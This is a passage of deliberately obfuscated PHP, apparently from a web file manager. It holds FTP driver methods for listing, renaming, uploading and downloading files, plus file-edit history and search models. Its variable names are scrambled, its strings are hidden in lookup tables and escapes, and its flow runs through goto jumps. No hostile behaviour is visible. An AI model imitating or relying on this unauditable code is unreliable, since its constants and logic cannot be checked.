$this->iconvSystem($CÒËÎ«¢íÅ); $Fœ´ò°å = $this->ftpList($CÒËÎ«¢íÅ); if (!$Fœ´ò°å) { return @ftp_rmdir($this->connect, $CÒËÎ«¢íÅ); } foreach ($Fœ´ò°å as $e¨Æ¹…Æšø) { if ($this->_isFolder($e¨Æ¹…Æšø)) { $e¨Æ¹…Æšø = $this->iconvApp($e¨Æ¹…Æšø); $this->delFolder($e¨Æ¹…Æšø); } else { @ftp_delete($this->connect, $e¨Æ¹…Æšø); } } return @ftp_rmdir($this->connect, $CÒËÎ«¢íÅ); } public function rename($fğå¸ó†»•, $b‰Œ…ñ®èÃ) { goto Fó‹ËÍìç²; Fø‘Ñ °™Ë: return $aóƒ…Õçƒ ? $this->getPathOuter($D¸¯ìÓÙëÙ) : !1; goto D·à‡µ§‚ù; Fó‹ËÍìç²: $aë·µÙô¼† =& $_SERVER[ÍÓÖ€°å]; if (!$this->_isconn()) { return !1; } $Bø¿ÁöùƒŞ = $this->fileNameAuto($this->pathFather($fğå¸ó†»•), $b‰Œ…ñ®èÃ); goto e²Áï†’Õ; e²Áï†’Õ: $Bø¿ÁöùƒŞ = $this->iconvSystem($Bø¿ÁöùƒŞ); $fğå¸ó†»• = $this->iconvSystem($fğå¸ó†»•); $f«¹¿†ôÌÌ = $this->pathFather($fğå¸ó†»•); goto E ÈŒõÜè·; E ÈŒõÜè·: $D¸¯ìÓÙëÙ = rtrim($f«¹¿†ôÌÌ, $aë·µÙô¼†[8]) . $aë·µÙô¼†[8] . $Bø¿ÁöùƒŞ; $aóƒ…Õçƒ = @ftp_rename($this->connect, $fğå¸ó†»•, $D¸¯ìÓÙëÙ); $D¸¯ìÓÙëÙ = $this->iconvApp($D¸¯ìÓÙëÙ); goto Fø‘Ñ °™Ë; D·à‡µ§‚ù: } public function size($EŞÊõ¼“Òä) { if (!$this->_isconn()) { return !1; } $EŞÊõ¼“Òä = $this->iconvSystem($EŞÊõ¼“Òä); return @ftp_size($this->connect, $EŞÊõ¼“Òä); } public function info($D¼ìøá Ó) { if (!$this->_isconn()) { return !1; } $D¼ìøá Ó = $this->iconvSystem($D¼ìøá Ó); if ($this->isFile($D¼ìøá Ó)) { return $this->fileInfo($D¼ìøá Ó, 1); } else { if ($this->isFolder($D¼ìøá Ó)) { return $this->folderInfo($D¼ìøá Ó); } } return !1; } private function folderInfo($d…ˆçÓã…, $Cà¿Š¼ÄÁ“ = false, $d‡ÉÕ‡ã = false) { $Fœì¦ö÷¦ø =& $_SERVER[ÍÓÖ€°å]; $FÊÃå·ò¶ = $this->iconvApp($this->pathThis($d…ˆçÓã…)); if ($d‡ÉÕ‡ã) { return array($Fœì¦ö÷¦ø[28] => $FÊÃå·ò¶, $Fœì¦ö÷¦ø[76] => $this->getPathOuter($d…ˆçÓã…), $Fœì¦ö÷¦ø[29] => $Fœì¦ö÷¦ø[77]); } $eÜèµÒ¬Í = array($Fœì¦ö÷¦ø[28] => $FÊÃå·ò¶, $Fœì¦ö÷¦ø[76] => $this->getPathOuter($d…ˆçÓã…), $Fœì¦ö÷¦ø[29] => $Fœì¦ö÷¦ø[77], $Fœì¦ö÷¦ø[175] => $Fœì¦ö÷¦ø[50], $Fœì¦ö÷¦ø[101] => $Fœì¦ö÷¦ø[50], $Fœì¦ö÷¦ø[863] => !0, $Fœì¦ö÷¦ø[864] => !0); if ($Cà¿Š¼ÄÁ“) { $eÜèµÒ¬Í[$Fœì¦ö÷¦ø[179]] = $this->has($d…ˆçÓã…, !1); $eÜèµÒ¬Í[$Fœì¦ö÷¦ø[180]] = $this->has($d…ˆçÓã…, !0); } return $eÜèµÒ¬Í; } private function fileInfo($e¡ÍñªòëÇ, $f†¨Š‰…ºæ = false) { $D¯ôÄ‘Á³â =& $_SERVER[ÍÓÖ€°å]; $e¡ÍñªòëÇ = rtrim($e¡ÍñªòëÇ, $D¯ôÄ‘Á³â[8]) . $D¯ôÄ‘Á³â[8]; $F±Ú›¯¬Êí = $this->iconvApp($this->pathThis($e¡ÍñªòëÇ)); if ($f†¨Š‰…ºæ) { return array($D¯ôÄ‘Á³â[28] => $F±Ú›¯¬Êí, $D¯ôÄ‘Á³â[76] => $this->getPathOuter($e¡ÍñªòëÇ), $D¯ôÄ‘Á³â[29] => $D¯ôÄ‘Á³â[155], $D¯ôÄ‘Á³â[148] => $this->ext($e¡ÍñªòëÇ), $D¯ôÄ‘Á³â[78] => $this->size($e¡ÍñªòëÇ)); } $b´Çš¥çïÓ = array($D¯ôÄ‘Á³â[28] => $F±Ú›¯¬Êí, $D¯ôÄ‘Á³â[76] => $this->getPathOuter($e¡ÍñªòëÇ), $D¯ôÄ‘Á³â[29] => $D¯ôÄ‘Á³â[155], $D¯ôÄ‘Á³â[175] => $D¯ôÄ‘Á³â[50], $D¯ôÄ‘Á³â[101] => @ftp_mdtm($this->connect, $e¡ÍñªòëÇ), $D¯ôÄ‘Á³â[148] => $this->ext($e¡ÍñªòëÇ), $D¯ôÄ‘Á³â[78] => $this->size($e¡ÍñªòëÇ), $D¯ôÄ‘Á³â[863] => !0, $D¯ôÄ‘Á³â[864] => !0); return $b´Çš¥çïÓ; } public function exist($b¼¢ñ”÷¬ø) { if (!$this->_isconn()) { return !1; } $b¼¢ñ”÷¬ø = $this->iconvSystem($b¼¢ñ”÷¬ø); if ($this->size($b¼¢ñ”÷¬ø) > -1) { return !0; } if ($this->isFolder($b¼¢ñ”÷¬ø)) { return !0; } return !1; } public function isFile($CÂìõ”¹ñ) { $FØÕŸ¿¨¹ =& $_SERVER[ÍÓÖ€°å]; if ($CÂìõ”¹ñ == $FØÕŸ¿¨¹[8]) { return !1; } if (!$this->_isconn() || !$this->exist($CÂìõ”¹ñ)) { return !1; } @ftp_chdir($this->connect, $FØÕŸ¿¨¹[8]); $CÂìõ”¹ñ = $this->iconvSystem($CÂìõ”¹ñ); return !$this->_isFolder($CÂìõ”¹ñ); } public function isFolder($d¢Ñ¨¯Ğîƒ) { if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $_SERVER[ÍÓÖ€°å][8]); $d¢Ñ¨¯Ğîƒ = $this->iconvSystem($d¢Ñ¨¯Ğîƒ); return $this->_isFolder($d¢Ñ¨¯Ğîƒ); } public function listPath($dÔ„®­ÚÚ, $B„Íé¼Æç– = false, $aâ¹µŒ ÷ö = false) { goto bÂÏ‰Áàà; Fù¨ô÷«Ç: $FôÏŞ©®„Î = $this->ftpList($dÔ„®­ÚÚ); $CÌñÂˆ­ÚÖ = array($E ¦‹À‰ñ¸[75] => array(), $E ¦‹À‰ñ¸[74] => array()); if (!$FôÏŞ©®„Î) { return $CÌñÂˆ­ÚÖ; } goto Dğ¿çÍÁ¢Û; bÂÏ‰Áàà: $E ¦‹À‰ñ¸ =& $_SERVER[ÍÓÖ€°å]; if (!$this->_isconn()) { return !1; } $dÔ„®­ÚÚ = $this->iconvSystem($dÔ„®­ÚÚ); goto Fù¨ô÷«Ç; Dğ¿çÍÁ¢Û: foreach ($FôÏŞ©®„Î as $dÔ„®­ÚÚ) { if ($this->_isFolder($dÔ„®­ÚÚ)) { $CÌñÂˆ­ÚÖ[$E ¦‹À‰ñ¸[75]][] = $this->folderInfo($dÔ„®­ÚÚ, $B„Íé¼Æç–, $aâ¹µŒ ÷ö); } else { $CÌñÂˆ­ÚÖ[$E ¦‹À‰ñ¸[74]][] = $this->fileInfo($dÔ„®­ÚÚ, $aâ¹µŒ ÷ö); } } return $CÌñÂˆ­ÚÖ; goto F—ÊÀµîÓŞ; F—ÊÀµîÓŞ: } private function _isFolder($d Û´¤ªê) { return @ftp_chdir($this->connect, $d Û´¤ªê); } public function has($d‡–¯µäÃˆ, $AŠĞùùß¿ = true) { if (!$this->_isconn()) { return !1; } $d‡–¯µäÃˆ = $this->iconvSystem($d‡–¯µäÃˆ); $A„§ì£ŒĞ­ = $this->ftpList($d‡–¯µäÃˆ); if (!$A„§ì£ŒĞ­) { return !1; } foreach ($A„§ì£ŒĞ­ as $d‡–¯µäÃˆ) { if ($AŠĞùùß¿) { if (!$this->_isFolder($d‡–¯µäÃˆ)) { return !0; } } else { if ($this->_isFolder($d‡–¯µäÃˆ)) { return !0; } } } return !1; } public function listAll($c‹…‚Ğ…š) { goto e‰ö‚²¹£; dÊ½Û³âŞÖ: $FÀèÓ§ÂÇ = $this->recursionFtpFiles($c‹…‚Ğ…š); $E¯ĞİğĞæ² = array(); foreach ($FÀèÓ§ÂÇ[$a†Ğß· õÌ[75]] as $F•Ÿò¼¨¡ˆ) { $E¯ĞİğĞæ²[] = array($a†Ğß· õÌ[76] => $a†Ğß· õÌ[8] . trim(str_replace($c‹…‚Ğ…š, $a†Ğß· õÌ[33], $F•Ÿò¼¨¡ˆ), $a†Ğß· õÌ[8]) . $a†Ğß· õÌ[8], $a†Ğß· õÌ[77] => 1, $a†Ğß· õÌ[78] => 0); } goto AØ›­ìá; e‰ö‚²¹£: $a†Ğß· õÌ =& $_SERVER[ÍÓÖ€°å]; if (!$this->_isconn()) { return !1; } $c‹…‚Ğ…š = $this->iconvSystem($c‹…‚Ğ…š); goto dÊ½Û³âŞÖ; AØ›­ìá: foreach ($FÀèÓ§ÂÇ[$a†Ğß· õÌ[74]] as $f¶¶£„‘) { $E¯ĞİğĞæ²[] = array($a†Ğß· õÌ[76] => $a†Ğß· õÌ[8] . trim(str_replace($c‹…‚Ğ…š, $a†Ğß· õÌ[33], $f¶¶£„‘), $a†Ğß· õÌ[8]), $a†Ğß· õÌ[77] => 0, $a†Ğß· õÌ[78] => $this->size($f¶¶£„‘)); } return $E¯ĞİğĞæ²; goto d¯ÕŞš—æù; d¯ÕŞš—æù: } public function getContent($E¢¥º×¹ÙĞ) { if (!$this->_isconn()) { return !1; } $E¢¥º×¹ÙĞ = $this->iconvSystem($E¢¥º×¹ÙĞ); return $this->fileSubstr($E¢¥º×¹ÙĞ); } public function setContent($b¸òÅÇ„Ø, $EåøŠ¶İ¢¯ = '') { goto bÏ–  ¾Øè; bÏ–  ¾Øè: if (!$this->_isconn()) { return !1; } $D±¢Š™Êâê = $this->pathThis($this->iconvSystem($b¸òÅÇ„Ø)); $b¨†¦Ü×ÕË = $this->tempFile($D±¢Š™Êâê); goto EÚ‰°ğàÇ; EÂÁÅËÓÎ–: $this->tempFileRemve($b¨†¦Ü×ÕË); return $fé‘¾™Ó¸‘; goto c‹Š†¹Ÿ; EÚ‰°ğàÇ: $fº„ò±  = $this->iconvApp($b¨†¦Ü×ÕË); file_put_contents($b¨†¦Ü×ÕË, $EåøŠ¶İ¢¯); $fé‘¾™Ó¸‘ = $this->upload($b¸òÅÇ„Ø, $fº„ò± ); goto EÂÁÅËÓÎ–; c‹Š†¹Ÿ: } public function fileSubstr($aæšÕ‘¨æØ, $AŠø×åé±„ = 0, $eæÅÊ„¬ï = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($aæšÕ‘¨æØ, $AŠø×åé±„, $eæÅÊ„¬ï); } private function ftpRequest($eÁøùš™Ê·, $C“ÒÕÒ‡Â = 0, $BœĞŠÏÉí„ = false) { goto B‚Ôïá‡¬Ó; C‘»ä—İÅæ: $dé“†¼Ÿö = curl_exec($FôŒ»Î¶Ô); curl_close($FôŒ»Î¶Ô); return $dé“†¼Ÿö; goto C½ãò¨Ëá; B‚Ôïá‡¬Ó: $eÁøùš™Ê· = $this->iconvSystem($eÁøùš™Ê·); $FôŒ»Î¶Ô = curl_init(); curl_setopt($FôŒ»Î¶Ô, CURLOPT_URL, "{$this->scheme}{$this->server}" . $this->pathEncode($eÁøùš™Ê·)); goto A¡¿´ÄÛĞí; A¡¿´ÄÛĞí: curl_setopt($FôŒ»Î¶Ô, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($BœĞŠÏÉí„) { $D—‹âÊì¼‚ = $C“ÒÕÒ‡Â + $BœĞŠÏÉí„ - 1; curl_setopt($FôŒ»Î¶Ô, CURLOPT_RANGE, "{$C“ÒÕÒ‡Â}\55{$D—‹âÊì¼‚}"); } curl_setopt($FôŒ»Î¶Ô, CURLOPT_RETURNTRANSFER, 1); goto C‘»ä—İÅæ; C½ãò¨Ëá: } public function upload($Fƒ¼ŸÙŠ‚, $Dœ²‘àÊŠŞ, $BÎ©ö½¦© = false, $F¦ŞÕ¾½„ = REPEAT_REPLACE) { goto f—ˆŠò×â; aƒËÍ¿åƒÊ: $Dœ²‘àÊŠŞ = $this->iconvSystem($Dœ²‘àÊŠŞ); $cØñãÙÀó² = ftp_nb_put($this->connect, $Fƒ¼ŸÙŠ‚, $Dœ²‘àÊŠŞ, FTP_BINARY); while ($cØñãÙÀó² == FTP_MOREDATA) { $cØñãÙÀó² = ftp_nb_continue($this->connect); } goto a¢¡Ï»Û‚Œ; a¢¡Ï»Û‚Œ: if ($cØñãÙÀó² != FTP_FINISHED) { return !1; } return $this->getPathOuter($Fƒ¼ŸÙŠ‚); goto b™çŒ¹ä¯; f—ˆŠò×â: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Fƒ¼ŸÙŠ‚))) { return !1; } $Fƒ¼ŸÙŠ‚ = $this->iconvSystem($Fƒ¼ŸÙŠ‚); goto aƒËÍ¿åƒÊ; b™çŒ¹ä¯: } public function download($Cƒ”ÛÓÊÎã, $D§ğã×Ïµ = '') { goto DçÀ¢‡ïæ; bÁÉ›íâ„: while ($aµ±êãŸ == FTP_MOREDATA) { $aµ±êãŸ = ftp_nb_continue($this->connect); } if ($aµ±êãŸ != FTP_FINISHED) { return !1; } return $this->iconvApp($D§ğã×Ïµ); goto eÀÍŞÏÏĞ; DçÀ¢‡ïæ: if (!$this->_isconn()) { return !1; } $cÅÏîÜ•—î = $this->pathFather($D§ğã×Ïµ); if (!IO::mkdir($cÅÏîÜ•—î)) { return !1; } goto b—·–ö„ß¤; b—·–ö„ß¤: $Cƒ”ÛÓÊÎã = $this->iconvSystem($Cƒ”ÛÓÊÎã); $D§ğã×Ïµ = $this->iconvSystem($D§ğã×Ïµ); $aµ±êãŸ = ftp_nb_get($this->connect, $D§ğã×Ïµ, $Cƒ”ÛÓÊÎã, FTP_BINARY); goto bÁÉ›íâ„; eÀÍŞÏÏĞ: } private function ftpList($b‹ªÁô“³ ) { $dÃÜŒë¡åŒ =& $_SERVER[ÍÓÖ€°å]; if (!$this->_isFolder($b‹ªÁô“³ )) { return !1; } @ftp_chdir($this->connect, $dÃÜŒë¡åŒ[8]); $b‹ªÁô“³  = $b‹ªÁô“³  == $dÃÜŒë¡åŒ[8] ? $b‹ªÁô“³  : $b‹ªÁô“³  . $dÃÜŒë¡åŒ[8]; $BçˆŠÙ¿Â = @ftp_nlist($this->connect, $b‹ªÁô“³ ); return array_map(function ($fõš…òÁ†‡) { $Fß¿²ôåé› =& $_SERVER[ÍÓÖ€°å]; return $Fß¿²ôåé›[8] . ltrim($fõš…òÁ†‡, $Fß¿²ôåé›[8]); }, $BçˆŠÙ¿Â); } private function recursionFtpFiles($e¯Ï™‡®ï³) { $fä˜ˆ¼·ª  =& $_SERVER[ÍÓÖ€°å]; if (!$this->_isconn()) { return !1; } if (!($DšÊãÖ™æ» = $this->ftpList($e¯Ï™‡®ï³))) { return !1; } static $AÊé§Â‰Ù = array(); foreach ($DšÊãÖ™æ» as $e¯Ï™‡®ï³) { if ($this->_isFolder($e¯Ï™‡®ï³)) { $this->recursionFtpFiles($e¯Ï™‡®ï³, $AÊé§Â‰Ù); $AÊé§Â‰Ù[$fä˜ˆ¼·ª [75]][] = $e¯Ï™‡®ï³; } else { $AÊé§Â‰Ù[$fä˜ˆ¼·ª [74]][] = $e¯Ï™‡®ï³; } } return $AÊé§Â‰Ù; } } goto cìªİƒïª‡; DÄøÙß¾‡‘: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\x72\x63\145\137\150\151\163\x74\157\162\171"; public function addHistory($C……Öàñ, $Fçª®àºæÍ = '') { $FÏî¿»®Ş¿ =& $_SERVER[î“×]; $Cë©£çøº• = array($FÏî¿»®Ş¿[0] => $C……Öàñ[$FÏî¿»®Ş¿[1]], $FÏî¿»®Ş¿[2] => isset($C……Öàñ[$FÏî¿»®Ş¿[3]]) ? $C……Öàñ[$FÏî¿»®Ş¿[3]] : $C……Öàñ[$FÏî¿»®Ş¿[4]], $FÏî¿»®Ş¿[5] => $C……Öàñ[$FÏî¿»®Ş¿[6]], $FÏî¿»®Ş¿[7] => $C……Öàñ[$FÏî¿»®Ş¿[8]], $FÏî¿»®Ş¿[9] => $Fçª®àºæÍ); $this->historyAutoClear($Cë©£çøº•[$FÏî¿»®Ş¿[1]]); $this->add($Cë©£çøº•); Model($FÏî¿»®Ş¿[10])->eventFileEdit($C……Öàñ[$FÏî¿»®Ş¿[1]]); } private function historyAutoClear($a²ØÚù®”Š) { goto câ»©×ìÚ; F›¢îËÛƒ¸: $båèòŸ„Ä = $this->field($B³øã¯í”µ[14])->where($a–§­ÍØÒê)->order($B³øã¯í”µ[15])->select(); if (!$båèòŸ„Ä || $cÄº­ì²ß >= count($båèòŸ„Ä)) { return; } $d¦»Îòõ¿Ê = array_to_keyvalue($båèòŸ„Ä, $B³øã¯í”µ[16], $B³øã¯í”µ[17]); goto cëïğçØºº; cëïğçØºº: $d¦»Îòõ¿Ê = array_slice($d¦»Îòõ¿Ê, $cÄº­ì²ß); $Bó… ÍÍĞ = array_to_keyvalue($båèòŸ„Ä, $B³øã¯í”µ[16], $B³øã¯í”µ[6]); $Bó… ÍÍĞ = array_slice($Bó… ÍÍĞ, $cÄº­ì²ß); goto DØÅñœâ‹È; AÖÉ§í: $cÄº­ì²ß = $AÁÀ•â‘ - 1; if ($cÄº­ì²ß >= 200) { return; } $a–§­ÍØÒê = array($B³øã¯í”µ[0] => $a²ØÚù®”Š); goto F›¢îËÛƒ¸; DØÅñœâ‹È: $a–§­ÍØÒê = array($B³øã¯í”µ[18] => array($B³øã¯í”µ[19], $d¦»Îòõ¿Ê)); $this->where($a–§­ÍØÒê)->delete(); Model($B³øã¯í”µ[20])->remove($Bó… ÍÍĞ); goto B¯•ŒÇ³ã; câ»©×ìÚ: $B³øã¯í”µ =& $_SERVER[î“×]; $a¬¦•›šÍ· = Model($B³øã¯í”µ[11])->get($B³øã¯í”µ[12]); $AÁÀ•â‘ = $a¬¦•›šÍ· == $B³øã¯í”µ[13] ? 3 : 1000; goto AÖÉ§í; B¯•ŒÇ³ã: } public function listData($D»í¡—´—) { goto AäÒ‚˜Â½; FÆ—‘éÖö: if ($bÚæ‘²ä…Ú == $E¼¢õ˜õŸ°[13]) { $dÙÑ¦ÔêÉË[$E¼¢õ˜õŸ°[22]] = array_slice($dÙÑ¦ÔêÉË[$E¼¢õ˜õŸ°[22]], 0, 3); $dÙÑ¦ÔêÉË[$E¼¢õ˜õŸ°[23]] = array($E¼¢õ˜õŸ°[24] => 1, $E¼¢õ˜õŸ°[25] => 20, $E¼¢õ˜õŸ°[26] => 1, $E¼¢õ˜õŸ°[27] => 3); } return $dÙÑ¦ÔêÉË; goto fÏšÛõ÷ˆ¥; eÇ¤ù†Ù–: $dÙÑ¦ÔêÉË = $this->field($e¶ä‚¹Œ¡ )->where($bÎÉßÓ…)->order($E¼¢õ˜õŸ°[15])->selectPage(); $this->_listAppendUser($dÙÑ¦ÔêÉË[$E¼¢õ˜õŸ°[22]]); $bÚæ‘²ä…Ú = Model($E¼¢õ˜õŸ°[11])->get($E¼¢õ˜õŸ°[12]); goto FÆ—‘éÖö; AäÒ‚˜Â½: $E¼¢õ˜õŸ° =& $_SERVER[î“×]; $bÎÉßÓ… = array($E¼¢õ˜õŸ°[0] => $D»í¡—´—); $e¶ä‚¹Œ¡  = $E¼¢õ˜õŸ°[21]; goto eÇ¤ù†Ù–; fÏšÛõ÷ˆ¥: } protected function _listAppendUser(&$C«£Îë¨²Á) { $FœÔ‰¼ÄÖ¬ =& $_SERVER[î“×]; $DƒÉ§¦ù­ = array_to_keyvalue($C«£Îë¨²Á, $FœÔ‰¼ÄÖ¬[16], $FœÔ‰¼ÄÖ¬[28]); $e¡ƒó³˜·œ = Model($FœÔ‰¼ÄÖ¬[29])->userListInfo($DƒÉ§¦ù­); foreach ($C«£Îë¨²Á as &$e¿† Š™Üß) { $bò±„´‡¶² = $e¿† Š™Üß[$FœÔ‰¼ÄÖ¬[28]]; $e¿† Š™Üß[$FœÔ‰¼ÄÖ¬[4]] = $e¡ƒó³˜·œ[$bò±„´‡¶²] ? $e¡ƒó³˜·œ[$bò±„´‡¶²] : !1; } } public function fileInfo($eƒí¡ƒìÅŠ) { $E–´î™œâ =& $_SERVER[î“×]; $a¡°œôĞƒ = $this->tablePrefix; $CÇÕ› º—× = "{$a¡°œôĞƒ}\151\157\137\x66\151\x6c\x65\x20\146\151\x6c\145\163\40\157\156\x20\146\x69\154\145\163\56\146\151\154\145\111\104\40\75\40\150\x69\163\164\157\x72\171\56\146\x69\x6c\x65\x49\x44"; return $this->alias($E–´î™œâ[30])->where(array($E–´î™œâ[18] => $eƒí¡ƒìÅŠ))->join($CÇÕ› º—×, $E–´î™œâ[31])->find(); } public function removeItem($FÂ™ªˆ¾àØ) { $Fè”Ïåø¶ =& $_SERVER[î“×]; $Då¶Š„Øº = array($Fè”Ïåø¶[18] => $FÂ™ªˆ¾àØ); $a“Š¨ÔŒŒ = $this->where($Då¶Š„Øº)->find(); if ($a“Š¨ÔŒŒ) { $Bİ½Õá¢˜é = $this->where($Då¶Š„Øº)->delete(); Model($Fè”Ïåø¶[20])->remove($a“Š¨ÔŒŒ[$Fè”Ïåø¶[6]]); return $Bİ½Õá¢˜é; } return !1; } public function removeBySource($C˜‘§œîê) { goto Aõ¥óÏ¶î°; f‹Œ¾ÙèóÒ: $C¿¼Ö¼Ù² = array($eÛùğ¾±£²[0] => array($eÛùğ¾±£²[19], $C˜‘§œîê)); $Cï½–âÕŠ = $this->field($eÛùğ¾±£²[5])->where($C¿¼Ö¼Ù²)->select(); if ($Cï½–âÕŠ) { $this->where($C¿¼Ö¼Ù²)->delete(); $cŒ»Äìöï = array_to_keyvalue($Cï½–âÕŠ, $eÛùğ¾±£²[16], $eÛùğ¾±£²[6]); Model($eÛùğ¾±£²[20])->remove($cŒ»Äìöï); } goto e“á‹è½ó“; Aõ¥óÏ¶î°: $eÛùğ¾±£² =& $_SERVER[î“×]; if (!$C˜‘§œîê) { return !1; } if (!is_array($C˜‘§œîê)) { $C˜‘§œîê = array($C˜‘§œîê); } goto f‹Œ¾ÙèóÒ; e“á‹è½ó“: return !0; goto Câ¥ºœ¬¬¹; Câ¥ºœ¬¬¹: } public function setDetail($B‘ÊƒŸó¨¯, $c³½¸½Ş²) { $aøæÄ÷šÙò =& $_SERVER[î“×]; return $this->where(array($aøæÄ÷šÙò[18] => $B‘ÊƒŸó¨¯))->save(array($aøæÄ÷šÙò[9] => $c³½¸½Ş²)); } public function rollbackToItem($f¯ ™ãƒÄ³, $bå±ÇšĞë) { goto cñî¼Ä²‘ë; aÂ¤³õ×©È: return $this->where(array($E”‰¡Ò‹¨å[18] => $bå±ÇšĞë))->delete(); goto Bè½İœãÀ; f©¶‚¯Ì: $bÜ‹…—Û…› = $this->find($bå±ÇšĞë); $D¸à¡·’™¦ = array($E”‰¡Ò‹¨å[6] => $bÜ‹…—Û…›[$E”‰¡Ò‹¨å[6]], $E”‰¡Ò‹¨å[8] => $bÜ‹…—Û…›[$E”‰¡Ò‹¨å[8]], $E”‰¡Ò‹¨å[3] => USER_ID); Model($E”‰¡Ò‹¨å[32])->where(array($E”‰¡Ò‹¨å[1] => $f¯ ™ãƒÄ³))->save($D¸à¡·’™¦); goto aÂ¤³õ×©È; cñî¼Ä²‘ë: $E”‰¡Ò‹¨å =& $_SERVER[î“×]; $a…·µ»‘„ = Model($E”‰¡Ò‹¨å[32])->sourceInfo($f¯ ™ãƒÄ³); $this->addHistory($a…·µ»‘„); goto f©¶‚¯Ì; Bè½İœãÀ: } public function clearSame($cĞÌ¨¸÷) { goto c¹«ÄÂ¥Éø; AĞ…Ùé›àÁ: if (!$c¨…Ğğôñä) { return; } $this->where(array($c–ÒùÊ±Û®[17] => array($c–ÒùÊ±Û®[19], $c¨…Ğğôñä)))->delete(); Model($c–ÒùÊ±Û®[20])->remove($Bã‰éïË¦ù); goto Bó‘ÜÖöáÎ; c¹«ÄÂ¥Éø: $c–ÒùÊ±Û® =& $_SERVER[î“×]; $d˜Ó‡¼´™ò = $this->listData($cĞÌ¨¸÷); $Dˆ’Ø–Èêâ = array_to_keyvalue_group($d˜Ó‡¼´™ò, $c–ÒùÊ±Û®[6]); goto e“¶äßŞæ¸; e“¶äßŞæ¸: $Bã‰éïË¦ù = array(); $c¨…Ğğôñä = array(); foreach ($Dˆ’Ø–Èêâ as $b—ÁùõÂ—‡) { if (count($b—ÁùõÂ—‡) <= 1) { continue; } foreach ($b—ÁùõÂ—‡ as $dµ²í¹·¨˜) { $Bã‰éïË¦ù[] = $dµ²í¹·¨˜[$c–ÒùÊ±Û®[6]]; $c¨…Ğğôñä[] = $dµ²í¹·¨˜[$c–ÒùÊ±Û®[17]]; } } goto AĞ…Ùé›àÁ; Bó‘ÜÖöáÎ: } public function userSpace() { $DÙ£ÊéóËì =& $_SERVER[î“×]; $eìŸºŸ¹¥˜ = $this->tablePrefix; $DÊ”ˆŞ×È½ = array($DÙ£ÊéóËì[2] => USER_ID); $BˆŸˆëˆØ = "{$eìŸºŸ¹¥˜}\x69\x6f\137\146\x69\x6c\145\40\146\151\154\145\163\40\157\x6e\40\x66\151\x6c\145\163\56\146\x69\x6c\145\111\104\x20\75\40\150\x69\163\164\x6f\x72\x79\x2e\x66\x69\x6c\x65\111\104"; return $this->alias($DÙ£ÊéóËì[30])->where($DÊ”ˆŞ×È½)->join($BˆŸˆëˆØ, $DÙ£ÊéóËì[31])->sum($DÙ£ÊéóËì[8]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($aõ…õ‰‡ºâ) { goto E×”»Œó; e®•¸¶ùİ: if (!$A‘‰†Îƒ[$C©¦Ÿ·ÉòĞ[148]]) { $a˜ß ÍáÅæ = array_to_keyvalue($fİ––äÚ÷Ô, $C©¦Ÿ·ÉòĞ[33], $C©¦Ÿ·ÉòĞ[148]); $f¹õÖÂ©à‚ = implode($C©¦Ÿ·ÉòĞ[47], $a˜ß ÍáÅæ); $Bİçù¨«‹ = $C©¦Ÿ·ÉòĞ[1667]; } $AŠÃÅâñ‰ = explode($C©¦Ÿ·ÉòĞ[47], trim($f¹õÖÂ©à‚, $C©¦Ÿ·ÉòĞ[47])); return array($Bİçù¨«‹, $AŠÃÅâñ‰); goto f•à¥Å•¤ó; E×”»Œó: $C©¦Ÿ·ÉòĞ =& $_SERVER[ÍÓÖ€°å]; $fİ––äÚ÷Ô = KodIO::fileTypeList(); $A‘‰†Îƒ = $fİ––äÚ÷Ô[$aõ…õ‰‡ºâ]; goto e½ª“Ô¼Şğ; e½ª“Ô¼Şğ: if (!$A‘‰†Îƒ) { return array(); } $f¹õÖÂ©à‚ = $A‘‰†Îƒ[$C©¦Ÿ·ÉòĞ[148]]; $Bİçù¨«‹ = $C©¦Ÿ·ÉòĞ[7]; goto e®•¸¶ùİ; f•à¥Å•¤ó: } public function listPathType($Fƒå†À„Ôö) { $dÔèö˜¨´ =& $_SERVER[ÍÓÖ€°å]; $C’ô³”õâ‡ = $this->fileTypeWhere($Fƒå†À„Ôö); if (!$C’ô³”õâ‡) { return array(); } $cÌôÂ£¼¿… = array($dÔèö˜¨´[383] => SourceModel::TYPE_USER, $dÔèö˜¨´[385] => USER_ID, $dÔèö˜¨´[377] => 0, $dÔèö˜¨´[379] => $C’ô³”õâ‡); return $this->listSource($cÌôÂ£¼¿…); } public function listSearch($F«Øß£è‹ƒ, $CÚï‹ŠÅÚã = 300) { goto bœÈÄ™Œáï; dÕµ©ƒù¯í: $this->alias($dÓã¾°ÙÈ‡[1702])->_makeOrder()->cache(null, 10); $FÆ”Ü±¥™² = $this->distinct(!0)->field($Cä‡òôÊù)->where($F¬ Òóò§ß)->selectPage($CÚï‹ŠÅÚã); $this->_listSearchDesc($FÆ”Ü±¥™², $F«Øß£è‹ƒ, $DÛô¡–çœì); goto C¡Œ¶ÔÂ·°; bç“…½÷: $Cä‡òôÊù = $dÓã¾°ÙÈ‡[1701]; $DÛô¡–çœì = $Cä‡òôÊù; $this->_listSearchBindPinyin($F«Øß£è‹ƒ, $F¬ Òóò§ß, $Cä‡òôÊù); goto dÕµ©ƒù¯í; dÀ÷õğÀÀ®: return $FÆ”Ü±¥™²; goto aå†™Ê’Îé; C¡Œ¶ÔÂ·°: $this->_listSearchTag($FÆ”Ü±¥™², $F«Øß£è‹ƒ, $DÛô¡–çœì); $this->_listDataApply($FÆ”Ü±¥™²[$dÓã¾°ÙÈ‡[345]]); $this->_listFilterInfo($FÆ”Ü±¥™²); goto dÀ÷õğÀÀ®; bœÈÄ™Œáï: $dÓã¾°ÙÈ‡ =& $_SERVER[ÍÓÖ€°å]; $F¬ Òóò§ß = $this->_parseSearchWhere($F«Øß£è‹ƒ); if (!isset($F¬ Òóò§ß[$dÓã¾°ÙÈ‡[401]])) { $F¬ Òóò§ß[$dÓã¾°ÙÈ‡[401]] = 0; } goto bç“…½÷; aå†™Ê’Îé: } private function _listSearchTag(&$f›Ò™ß, $a‡ÄŒˆœä•, $aÁŸ®ÊŒƒ®) { goto fí¾²ª¢Ê; A”öÖÚâñÁ: $Bƒ…ÜßÔöÚ = array(); $B»ƒøÌ³ß­ = $a‡ÄŒˆœä•[$EÏÏÖîóõª[1604]]; foreach ($fšò°ÌÔŠ¹ as $eÀ²ôˆ…È—) { 